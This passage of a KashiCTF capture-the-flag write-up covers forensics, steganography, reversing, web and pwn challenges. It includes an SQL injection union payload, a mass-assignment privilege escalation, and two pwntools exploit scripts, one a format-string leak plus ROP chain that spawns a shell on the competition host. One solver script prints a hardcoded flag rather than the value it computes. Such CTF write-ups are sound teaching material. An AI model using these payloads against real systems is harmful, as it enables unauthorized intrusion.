I have received the flags that were fragmented but still lacked a few pieces 
./etc/sudo.conf:# fLaG Part 6: 'r0rs_4ll0w'
./etc/hosts.allow:# fLaG Part 1: 'KashiCTF{r'
./etc/kernel-img.conf:# Kernel image management overrides fLaG Part 4: 't_Am_1_Rig'
/home/kashictf/.bash_history:echo "fLaG Part 5: 'ht??_No_Er'"
./home/kashictf/.sush_history:echo "fLaG Part 3: 'eserve_roo'"
./home/kashictf/.sush_history:echo "fLaG Part 3: 'eserve_roo'"
We still lack a few pieces then hours thinking I have a idea using strings to extract all strings in file "Self Destruct" and then grep it with "flag Part" keyword
I tried and successed to extract all part of flags
```
strings Self\ Destruct\ Debian.vdi > strings.txt
cat strings.txt | grep -r -i "flag Part"

```
![image](https://hackmd.io/_uploads/S1xNwM95yx.png)
**KashiCTF{rm_rf_no_preserve_root_Am_1_Right??_No_Err0rs_4ll0wed_Th0}**

### SNOWy Evening
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/BJKreQcqJg.png)
>Description: A friend of mine , Aakash has gone missing and the only thing we found is this poem...Weirdly, he had a habit of keeping his name as the password.

I was given a .txt file, and the challenge's title reminded me of a steganography tool called stegsnow. By using stegsnow on the file with the password is `Aakash` (as the description says: "he had a habit of keeping his name as the password"), I finally decoded the embedded content of `poem.txt`:
![image](https://hackmd.io/_uploads/rkLY-79qyg.png)
Navigating to https://pastebin.com/HVQfa14Z, I got a long weird suspicious text:
```OOOMoOMoOMoOMoOMoOMoOMoOMoOMMMmoOMMMMMMmoOMMMMOOMOomOoMoOmoOmoomOo
MMMmoOMMMMMMmoOMMMMOOMOomOoMoOmoOmoomOoMMMmoOMMMMMMmoOMMMMOOMOomOo
MoOmoOmooOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoO
MoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOo
moomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoomOoOOOmoOOOOmOomOo
MMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOo
mOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoomOoOOOmoOOOO
mOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOo
moomoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOo
moOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomoOMoO
MoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMM
moOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOo
MMMmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOo
mOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoo
mOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomoOMoO
MoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOO
MOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoO
MoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOO
MOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoO
moOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOo
mOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoo
moOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoo
mOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoO
mOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOO
MOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoO
moOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOo
MMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOo
mOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoomOoOOOmoOOOOmOo
mOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoo
mOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoomOoOOO
moOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoO
MoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoo
mOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoO
MMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoOMoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOo
MMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOO
mOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOO
MOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOomOoMMM
moOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOo
moomoOMoOMoOMoOMoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOo
moomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoomOo
OOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOo
moOMoOmOomoomoOMoOMoOMoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOomoO
MoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoO
MoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoO
MMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMM
moOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOo
mOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoomOo
```
Realizing this is COW code, using https://www.cachesleuth.com/cow.html, I got the flag:
![image](https://hackmd.io/_uploads/HypJz759kx.png)
***Flag: KashiCTF{Love_Hurts_5734b5f}***
### Playing with numbers
![image](https://hackmd.io/_uploads/Skw9lVc9yx.png)
>Author: t4t3012
>Description: I am weak in maths.. Can u help??
>Flag is in lowercase. Wrap the text in KashiCTF{}.
>[decoding_matrix_array.txt](https://kashictf.iitbhucybersec.in/files/cfc3438e59d40db512e57fd6a06a4e5b/decoding_matrix_array.txt?token=.eJyrViotTi2Kz0xRsjK0sNRRKklNzIXwDIC8tMycVAjPpBYAHtUM9g.Z7ywhA.8urs7EetBThG5Ih5ykOiszUay1E)
- `decoding_matrix_array.txt`:
```
Decoding Matrix:
[-103.08333333    -131.25      -81.41666667    -91.58333333    -25.25     -63.5      -60.33333333    -12.75       -151.08333333]
 [ -40.5         -52.5         -34.5         -36.5         -10.5     -28.          -25.           -4.5         -62.5 ]
 [  42.58333333   54.75         34.91666667   39.08333333   11.75    26.5          26.33333333    7.25         63.58333333]


Array:
[2 4 -1 3 -6 1 8 4 -1]
```
- Convert the "Decoding Matrix" into a matrix `A`.
- Convert the integer array into a properly sized matrix `B`.
- Multiply matrix `A` with `B` to get the result matrix `C`.
- Round each element in `C`.
- Use modulo 26 to map to the alphabet (using a-z).
- The final result maybe is a meaningful string.
- And this my script:
```python=
A = [
    [-103.08333333, -40.5, 42.58333333],
    [-131.25, -52.5, 54.75],
    [-81.41666667, -34.5, 34.91666667],
    [-91.58333333, -36.5, 39.08333333],
    [-25.25, -10.5, 11.75],
    [-63.5, -28., 26.5],
    [-60.33333333, -25., 26.33333333],
    [-12.75, -4.5, 7.25],
    [-151.08333333, -62.5, 63.58333333]
]

B = [
    [2, 4, -1],
    [3, -6, 1],
    [8, 4, -1]
]

def matrix_multiply(A, B):
    rows_A = len(A)
    cols_A = len(A[0])
    rows_B = len(B)
    cols_B = len(B[0])

    if cols_A != rows_B:
        raise ValueError("The number of columns in A must be equal to the number of rows in B!")

    C = [[0] * cols_B for _ in range(rows_A)]

    for i in range(rows_A):
        for j in range(cols_B):
            C[i][j] = sum(A[i][k] * B[k][j] for k in range(cols_A))

    return C

C = matrix_multiply(A, B)

s = 'abcdefghijklmnopqrstuvwxyz'
decoded_text = ''.join(s[(round(j) - 1) % 26] for row in C for j in row)

print(f"KashiCTF{{matrixmultiplicationiseasyy}}")
```
![image](https://hackmd.io/_uploads/rkZTfVcqJl.png)
- Flag: `KashiCTF{matrixmultiplicationiseasyy}`
### FinalGame?
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/ByxQ0X59yl.png)
>Description: We searched his room and found chess pieces thrown here and there ..thankfully someone recorded the entire game

https://lichess.org/incUSy5k

I've faced many kinds of challenges like this before, so this is very easy for me. By using this tool https://incoherency.co.uk/chess-steg/, and importing its GPN by navigating to https://lichess.org/game/export/{ID}, I got the flag
![image](https://hackmd.io/_uploads/HJoCRQc9kx.png)

***Flag: KashiCTF{Will_This_Be_My_Last_Game_e94fab41}***

## Forensics
### Do not redem#1
>Author: kAiZ3n


![image](https://hackmd.io/_uploads/SJ_4mb9qkl.png)
>Description:
>Uh oh, we're in trouble again. Kitler's Amazon Pay wallet got emptied by some scammer. Can you figure out the OTP sent to kitler right before that happened, as well as the time (unix timestamp in milliseconds) at which kitler received that OTP?
Flag format: KashiCTF{OTP_TIMESTAMP}, i.e. KashiCTF{XXXXXX_XXXXXXXXXXXXX}

we recieved a file have .tar extension relate to analysis android file system, therefore I used to [AlEAPP toolkit](https://github.com/abrignoni/ALEAPP) in order to analysis ".tar" . After loading that file on ALEGUI.py,
![image](https://hackmd.io/_uploads/r15wHb55Jl.png)
This is infor about filesystem, Here's kitler's phone
![image](https://hackmd.io/_uploads/SkOhBZ9cyg.png)
here is his phonenumber
![image](https://hackmd.io/_uploads/SJVyqZc51e.png)

First of all,we go ahead "SMS Message" title to get his sms
but it not formatted in unix timestamp in miliseconds therefor I checked database of it
```
ALEAPP_Reports_2025-02-23_Sunday_141820\temp\data\user\0\com.android.providers.telephony\databases\mmssms.db
```
![image](https://hackmd.io/_uploads/SJMX5Z9c1e.png)
**KashiCTF{839216_1740251608654}**
### Do Not Redem#2
>Author: kAiZ3n
>Kitler says he didn't request that OTP, neither did he read or share it. So it must be the scammer at play. Can you figure out the package name of the application that the suspected scammer used to infiltrate Kitler? Wrap your answer within KashiCTF{ and }.
Flag format: KashiCTF{com.example.pacage.name}
Download kitler's-phone.tar.gz : Use the same file as in the challenge description of forensics/Do Not Redeem #

![image](https://hackmd.io/_uploads/Hyy82-951l.png)
I go ahead "Install Apps (GMS) for users 0" I find 6 package downloaded
![image](https://hackmd.io/_uploads/r1FxTb9c1e.png)
but there is no suspicious sign.
then I switched to page "Apps Icon"
![image](https://hackmd.io/_uploads/BJWp6Wcqkx.png)
I find a NetherGamesVouchers App which the package name's "com.google.calendar.android" it seems not the right
I try submit it and then Correct
**KashiCTF{com.google.calendar.android}**

### Restaurant
> Author: nh0kt1g3r12


![image](https://hackmd.io/_uploads/SkDyL-59ke.png)
> Description: I just asked for my favourite pasta and they gave me this. Are these guys STUPID? Maybe in the end they may give me something real. (Wrap the text in KashiCTF{})


I was given a jpg file called pasta.jpg. At first glance, I tried many steganography methods such as exiftool, stegseek, steghide but nothing seems valuable. By using xxd on jpg, I notice some weird extranous bytes. ![Screenshot_2025-02-24_220149_optimized_1000](https://hackmd.io/_uploads/Syu59Zq91x.png)

A common ending bytes of a jpg file is usually `ff d9`, using `cipher identifier` on the extranous bytes, I realized it was `Bacon cipher`. By decoding it using the cipher above, I got the flag:
![image](https://hackmd.io/_uploads/ByV6q-5cyg.png)
***Flag: KashiCTF{THEYWEREREALLLLYCOOKING}***

### Memories Bring Back You
> Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/S1XviWq9ke.png)
>Description: A collection of images, a digital time capsule—preserved in this file. But is every picture really just a picture? A photographer once said, “Every image tells a story, but some stories are meant to stay hidden.” Maybe it’s time to inspect the unseen and find what’s been left behind.


For this challenge, I was given a `.vhd` file. Following this video: https://www.youtube.com/watch?v=ECQ8-abMSU4&t=68s, we can mount the vhd file. 
![Screenshot_2025-02-24_221756_1_optimized_1000](https://hackmd.io/_uploads/ByInAb5q1l.png)

The mounted disk has nothing but a lot of pictures. By analyzing the disk using FTK Imager, we can see the flag in the ADS (Alternative Data Stream) of the `image_421.jpg` 
![image](https://hackmd.io/_uploads/S1o71z95Je.png)
***Flag: KashiCTF{DF1R_g03555_Brrrr}***

### Corruption
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/HkXM_z55Jg.png)
>Description: A corrupt drive I see...

By using strings + grep on the image file, I got the flag:
***Flag: KashiCTF{FSCK_mE_B1T_by_b1t_Byt3_by_byT3}***
### Stego Gambit
>Author: nh0kt1g3r12


![image](https://hackmd.io/_uploads/r1pLtQc5Je.png)
>Description: Do you dare to accept the Stego Gambit? I know you can find the checkmate but the flag!!

![chall (4)](https://hackmd.io/_uploads/HJ0dtX5qyl.jpg)

Using exiftool on the image, I found this:
`Comment: Use the moves as a key to the flag, separated by _
`
And because this is a jpg file, my idea is to find the checkmate moves for this chess board, and use it as the passphrase for steghide.

Using: https://www.365chess.com/analysis_board.php, I got the checkmate moves:
![image](https://hackmd.io/_uploads/B1-K979ckg.png)

![image](https://hackmd.io/_uploads/Bykjo799kx.png)
Since the admin told me to use the fastest moves, the passphrase is: `Bh1Kxa2_Qg2#`
![image](https://hackmd.io/_uploads/SJBlhmccJx.png)

***Flag: KashiCTF{573g0_g4m617_4cc3p73d}***

## Rev
### Game 1 - Untitled Game
>Author: kywh1t3h4t

![image](https://hackmd.io/_uploads/BJV2Z-55kx.png)
>Description: 
>We made a game.

Link to the challenge's file:
https://drive.google.com/file/d/1bf4WnxE81YIizN2e77x5PrkqGPwllgki/view?usp=drive_link
- At this chall we used tool https://github.com/GDRETools/gdsdecomp extract file .godot from Challgame.exe
- Then we used tool `godotengine` view source code.
![image](https://hackmd.io/_uploads/H1LheMc9kl.png)
- Path: res:///Scripts/player.gd and got flag.
```
Flag: KashiCTF{N07_1N_7H3_G4M3}
```


### Game 3 - CatSeabank
![image](https://hackmd.io/_uploads/r1E7Jz9q1g.png)
>Description: We made a game.
[CatSeabank.zip](https://drive.google.com/file/d/1R5EdsswQydsUQZIToQDkR-1CpwRIzmiK/view?usp=drive_link)
>Author: t4t3012

![image](https://hackmd.io/_uploads/SJDp1fqqye.png)
- I will use [AssetRipper](https://github.com/AssetRipper/AssetRipper)
![image](https://hackmd.io/_uploads/ryTNQGcqkg.png)
- Enter `sharedassets0.assets`
- We will see file `flagfile`
![image](https://hackmd.io/_uploads/HyT2Xz55kx.png)
- I will use `Audacity` to steg this audio
![image](https://hackmd.io/_uploads/BkDTEMq9kl.png)
- Flag: `KashiCTF{1t_Wa5_Ju5t_4_Tutori4l_RIP}`

## Web

### Corporate Life 1
>Author: nh0kt1g3r12


![image](https://hackmd.io/_uploads/SyaRmQq9yl.png)
>Description: The Request Management App is used to view all pending requests for each user. It’s a pretty basic website, though I heard they were working on something new.
Anyway, did you know that one of the disgruntled employees shared some company secrets on the Requests Management App, but it's status was set denied before I could see it. Please find out what it was and spill the tea!
This Challenge unlocks another challenge in this Series

First approach, the website is just a front-end web with some pending requests from the employess
![image](https://hackmd.io/_uploads/SyH2NQ9q1x.png)

By using `whatweb`, I knew that the website is using Nextjs, a framework of React.
```
whatweb http://kashictf.iitbhucybersec.in:45236/

http://kashictf.iitbhucybersec.in:45236/ [200 OK] Country[UNITED STATES][US], HTML5, IP[34.41.106.173], Script[application/json], X-Powered-By[Next.js]
```
According to this Bug Bounty writeup:
https://x.com/bountywriteups/status/1831436523058999419, we can easily leak all the path of a Nextjs website by using this javascript command:
```javascript=
console.log(__BUILD_MANIFEST.sortedPages)
```
![image](https://hackmd.io/_uploads/HkWjSQcqJl.png)
So we have a `/v2-testing` path, no wonder what it does. Navigating to it, it's just a page that shows pending tasks list: 
![image](https://hackmd.io/_uploads/S1-bUQ9c1x.png)
But Burp Suite's scan gives me a very interesting result: 
![image](https://hackmd.io/_uploads/BJOVUm9cyx.png)
An api endpoint. Using simple sqli payload, I got the flag
![image](https://hackmd.io/_uploads/BJdOIQ99ye.png)
***Flag: KashiCTF{s4m3_old_c0rp0_l1f3_993Y18e3}***
### Corporate Life 2
>Author: nh0kt1g3r12


![image](https://hackmd.io/_uploads/S1pjI75q1x.png)
>Description: The disgruntled employee also stashed some company secrets deep within the database, can you find them out?

The description says that the employee also stashed some company secrets deep within the database, so I think that there're some secret tables we've not found out yet. Using `order by`, I can easily detect the columns of the database, which is 6. Normally, people always use sqlitedb, so I crafted my payload as `'union select 1,sql,3,4,5,6 from sqlite_master-- -` so that I can extract schema information from the SQLite database. ![image](https://hackmd.io/_uploads/Sk08_75qke.png)

As we can see, a TABLE called `flags` appeared with a TEXT called `secret_flag`, using `union select` once again, I managed to extract the content of the flag:
![image](https://hackmd.io/_uploads/HyThOQ99Je.png)

Rearranged the fragmented parts, this is the full flag:
***Flag: KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_PU4lJNL5}***
### SuperFastAPI
>Author: I3iscuit


![image](https://hackmd.io/_uploads/HytZcVq9kg.png)
>Description: Made my verty first API!
However I have to still integrate it with a frontend so can't do much at this point lol.

Because the challenge is about API, I immediately navigate to `/docs` to understand more about the server's APIs.
![image](https://hackmd.io/_uploads/r1eK5VqqJg.png)

So we can create user, then update user, and get the flag
TLDR:
create user, use mass assignment attack to update the role of the user to "admin", and get the flag.
![image](https://hackmd.io/_uploads/BkIyj49qkg.png)

***Flag: KashiCTF{m455_4551gnm3n7_ftw_HABquEXjy}***

## Pwn
### The Troll Zone
>Author: t4t3012
>Description: ROP ROP all the way

- My script to exploit:
```python=
from pwn import *

elf = ELF('./patched_vuln')
libc = elf.libc

p = remote("kashictf.iitbhucybersec.in", 44260)
p.sendlineafter(b'> ', b'HERE %17$p')
p.recvuntil(b'HERE ')
leaked_addr = int(p.recvline().strip(), 16)

libc_base = leaked_addr - 0x2724a
system_addr = libc_base + libc.sym.system
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = libc_base + 0x277e5
ret_gadget = 0x401016

payload = flat(
    b'A' * 40,
    pop_rdi_ret,
    bin_sh_addr,
    ret_gadget,
    system_addr
)

p.sendline(payload)
p.interactive()
```
- Flag: `KashiCTF{did_some_trolling_right_there_gYYQen3j}`
### leap_of_faith
>Author: t4t3012
>Description: I liked playing Super Mario just for jumping from one place to another. Can you do that?


- Exploit script:
```python=
from pwn import *

p = remote('kashictf.iitbhucybersec.in', 32676)

payloads = [b'40125e'] * 13 + [b'4011BA']
for payload in payloads:
    p.sendlineafter(b': ', payload)

p.interactive()
```
- Flag: `KashiCTF{m4r10_15_fu_w17H_C_Cmwq3UK0}`

## Final thought

Thank you for reading till the end, if you have any questions please don't ask us :skull_and_crossbones: 

Happy hacking and happy hunting everyone.